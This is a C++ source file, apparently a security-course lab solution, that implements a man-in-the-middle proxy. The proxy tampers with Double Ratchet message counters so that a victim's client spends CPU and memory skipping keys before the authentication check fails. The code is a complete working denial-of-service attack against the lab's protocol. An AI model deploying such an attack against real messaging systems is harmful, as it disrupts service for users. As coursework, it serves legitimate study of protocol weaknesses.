// attack0.cpp -- MITM message-counter manipulation (resource exhaustion)
//
// Scenario (assignment_pdf.pdf, Attack 0): Mallory sits between the server
// and Bob. Point Bob at Mallory instead of the real server:
//
//   docker compose run --rm bob --serve-addr <mallory_ip> --port <mallory_port>
//
// Mallory is a transparent TCP proxy for everything EXCEPT the server's
// "frames" responses to Bob's "poll" requests (protocol.md 2.4). For any
// Frame addressed "to":"bob" in that response, Mallory rewrites
// header.n (and, with --pn, header.pn) to push the message counter far
// ahead of where Bob's ratchet state currently is, then forwards the
// doctored line.
//
// What this tests (protocol.md 4.4, ratchet_decrypt / skip_message_keys):
//
//   def ratchet_decrypt(st, header, ct):
//       mk = try_skipped_keys(st, header)
//       if mk is not None: ...
//       if header["dh"] != st.DHr:
//           skip_message_keys(st, header["pn"])
//           dh_ratchet(st, header)
//       skip_message_keys(st, header["n"])      # <-- runs BEFORE auth check
//       mk, st.CKr = kdf_ck(st.CKr)
//       st.Nr += 1
//       return aead_decrypt(mk, ct, st.AD + serialize(header))   # <-- auth check
//
// skip_message_keys() walks the symmetric receiving chain (HMAC-SHA256,
// twice per step) from st.Nr up to the attacker-supplied header["n"],
// bounded only by MAX_SKIP=1000, and stores one entry per skipped key in
// st.skipped BEFORE the AEAD tag on the (now-mismatched) ciphertext is
// ever checked. Because the AEAD associated data includes the header
// (ad = st.AD + serialize(header)), the final aead_decrypt() call is
// expected to fail once Mallory has changed header.n/pn -- but the CPU
// (up to 1000 HMAC double-steps) and memory (up to 1000 skipped-key map
// entries) have already been spent by the time that failure happens.
// Repeating this (the loop below sends a fresh gap on every observed
// frame) grows Bob's skipped-key table and CPU burn without bound, which
// is the resource-exhaustion / DoS behavior Attack 0 part C asks you to
// plot with `docker stats`.
//
// Build: see README.md / Makefile.

#include "common/json_mini.hpp"
#include "common/netutil.hpp"
#include <atomic>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <thread>
#include <unistd.h>

struct Options {
    std::string listenAddr = "0.0.0.0";
    int listenPort = 9100;
    std::string serverHost = "as3_server";
    int serverPort = 9000;
    long gapN = 999;      // header.n Mallory injects (MAX_SKIP is 1000; stay under/at the edge to study the boundary)
    long gapPn = -1;      // -1 => leave header.pn untouched; else override too
    std::string victim = "bob";
};

static Options parseArgs(int argc, char** argv) {
    Options o;
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto val = [&](int& i) { return std::string(argv[++i]); };
        if (a == "--listen-addr") o.listenAddr = val(i);
        else if (a == "--listen-port") o.listenPort = std::stoi(val(i));
        else if (a == "--server-host") o.serverHost = val(i);
        else if (a == "--server-port") o.serverPort = std::stoi(val(i));
        else if (a == "--gap-n") o.gapN = std::stol(val(i));
        else if (a == "--gap-pn") o.gapPn = std::stol(val(i));
        else if (a == "--victim") o.victim = val(i);
        else if (a == "--help") {
            printf("usage: attack0 [--listen-addr A] [--listen-port P] "
                   "[--server-host H] [--server-port P] [--gap-n N] "
                   "[--gap-pn N] [--victim user]\n");
            exit(0);
        }
    }
    return o;
}

// Rewrite header.n (and optionally header.pn) on every Frame in a "frames"
// response addressed to the victim; pass every other envelope through
// byte-for-byte.
static std::string tamper(const std::string& line, const Options& o, long& tamperedCount) {
    json::Value env;
    try {
        env = json::parse(line);
    } catch (...) {
        return line; // not JSON we understand -- pass through unchanged
    }
    if (env.getStr("type") != "frames") return line;

    auto* framesArr = env.find("frames");
    if (!framesArr || framesArr->type != json::Type::Array) return line;

    for (auto& frame : framesArr->arr) {
        if (frame.getStr("to") != o.victim) continue;
        auto* header = const_cast<json::Value*>(frame.find("header"));
        if (!header) continue;
        long origN = header->getInt("n", -1);
        long origPn = header->getInt("pn", -1);
        header->set("n", json::Value::mkNum((double)o.gapN));
        if (o.gapPn >= 0) header->set("pn", json::Value::mkNum((double)o.gapPn));
        tamperedCount++;
        fprintf(stderr,
                "[mallory] tampered frame to=%s from=%s : n %ld -> %ld"
                "%s\n",
                o.victim.c_str(), frame.getStr("from").c_str(), origN, o.gapN,
                (o.gapPn >= 0 ? (", pn " + std::to_string(origPn) + " -> " + std::to_string(o.gapPn)).c_str() : ""));
    }
    return json::dump(env);
}

// Pump raw lines from `from` to `to`, applying `transform` to each line.
static void pump(int from, int to, const Options& o, bool doTamper, std::atomic<bool>& alive, long& counter) {
    net::LineReader reader(from);
    std::string line;
    try {
        while (reader.readLine(line)) {
            std::string out = doTamper ? tamper(line, o, counter) : line;
            net::sendLine(to, out);
        }
    } catch (...) {
        // peer closed / error -- fall through to shutdown
    }
    alive = false;
    shutdown(from, SHUT_RDWR);
    shutdown(to, SHUT_RDWR);
}

static void handleClient(int clientFd, const Options& o) {
    int serverFd;
    try {
        serverFd = net::connectTo(o.serverHost, o.serverPort);
    } catch (std::exception& e) {
        fprintf(stderr, "[mallory] could not reach real server: %s\n", e.what());
        close(clientFd);
        return;
    }
    fprintf(stderr, "[mallory] client connected, proxying to %s:%d (gap n=%ld)\n",
            o.serverHost.c_str(), o.serverPort, o.gapN);

    std::atomic<bool> alive{true};
    long tamperedCount = 0;

    // client(Bob) -> server: passed through unmodified (Attack 0 only
    // needs to tamper what Bob *receives*; see protocol.md diagram).
    std::thread t1(pump, clientFd, serverFd, std::cref(o), false, std::ref(alive), std::ref(tamperedCount));
    // server -> client(Bob): tamper "frames" responses addressed to victim.
    std::thread t2(pump, serverFd, clientFd, std::cref(o), true, std::ref(alive), std::ref(tamperedCount));

    t1.join();
    t2.join();
    close(clientFd);
    close(serverFd);
    fprintf(stderr, "[mallory] connection closed (tampered %ld frames)\n", tamperedCount);
}

int main(int argc, char** argv) {
    Options o = parseArgs(argc, argv);
    int listenFd;
    try {
        listenFd = net::listenOn(o.listenAddr, o.listenPort);
    } catch (std::exception& e) {
        fprintf(stderr, "fatal: %s\n", e.what());
        return 1;
    }
    fprintf(stderr,
            "[mallory] attack0 MITM proxy listening on %s:%d, forwarding to %s:%d\n"
            "[mallory] point the victim at this proxy, e.g.:\n"
            "  docker compose run --rm bob --serve-addr <mallory_ip> --port %d\n",
            o.listenAddr.c_str(), o.listenPort, o.serverHost.c_str(), o.serverPort, o.listenPort);

    while (true) {
        sockaddr_in cliAddr{};
        socklen_t len = sizeof(cliAddr);
        int clientFd = accept(listenFd, (sockaddr*)&cliAddr, &len);
        if (clientFd < 0) continue;
        std::thread(handleClient, clientFd, o).detach();
    }
    return 0;
}
